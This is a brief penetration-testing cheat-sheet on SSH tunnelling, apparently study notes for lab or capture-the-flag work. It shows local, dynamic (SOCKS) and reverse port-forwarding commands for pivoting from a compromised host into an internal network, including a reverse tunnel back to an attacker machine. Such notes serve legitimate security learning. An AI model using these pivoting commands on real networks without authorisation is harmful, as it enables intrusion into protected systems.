# SSH tunnelling / port forwarding

## Local(forward)

If compromised machine=172.16.0.5 and internal webserver=172.16.0.10

`ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`  

Where we would access through attack machine `localhost:8000`, `-f` backgrounds immediately and `-N` is for no commands or shell just a connection.  


Open port 1337 on attack machine to proxy into protected network compromised machine=172.16.0.5.  

`ssh -D 1337 user@172.16.0.5 -fN`

## Reverse  

Accessing the attack machine from the compromised machine, useful if only ssh client is available on the compromised machine and not ssh server.  

On attack machine, generate keys.  

`ssh-keygen`  

Copy public key and edit `~/.ssh/authorized_keys` with:  

`command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa jdfjfjjdd3bb3= user@machine`  

Check server status.  

`sudo systemctl status ssh`

Start ssh server.  

`sudo systemctl start ssh`  

After transfering private key to compromised machine.  

`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN`  

Where 172.16.0.20 is attacker machine, 172.16.0.10 is internal webserver on protected network.
